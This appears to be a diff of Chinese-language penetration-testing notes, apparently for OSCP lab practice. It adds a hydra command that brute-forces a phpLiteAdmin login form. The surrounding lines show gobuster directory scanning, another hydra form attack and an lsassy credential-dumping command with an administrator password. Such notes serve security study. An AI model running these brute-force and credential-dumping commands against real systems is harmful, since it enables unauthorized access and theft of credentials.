@@ -135,6 +135,9 @@ gobuster dir -u http://xxxxx -U admin -P admin -x php -w /usr/share/xxxxxx
 - 爆破前端表单
 ```bash
 hydra 172.20.10.3 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l xekOnerR -P /usr/share/wordlists/rockyou.txt
+
+(phpliteadmin爆破) + 小字典尝试
+hydra 10.129.255.87 -l xekOnerR -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
 ```
 
 - 爆破前端 GET [+ Base64]编码的验证方式：
@@ -322,4 +325,4 @@ lsassy -d MS01.oscp.exam -u administrator -p December31 192.168.244.153
 
 
 **MailSniper (outlook Web, Office 365, Exchange)**
-[CMS 漏洞，攻击向量](CMS%20漏洞，攻击向量.md)
+[CMS (Web) 漏洞，攻击向量](CMS%20(Web)%20漏洞，攻击向量.md)
